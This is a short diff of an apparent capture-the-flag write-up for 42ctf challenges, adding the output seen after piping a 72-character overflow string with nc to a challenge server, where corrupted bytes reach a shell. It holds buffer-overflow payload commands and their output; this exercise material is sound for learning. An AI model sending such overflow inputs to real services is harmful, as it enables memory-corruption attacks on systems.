@@ -10,6 +10,11 @@ $ (x=40; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done; echo -n "*";
 # 72 a's
 
 $ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc challenges.42ctf.org 3003
+
+. . .
+Gimme a trusted input plz:
+sh: 1: ??1?I??^H??H???PTI???@: not found
+. . .
 ```
 ## Stack leak
 ```r
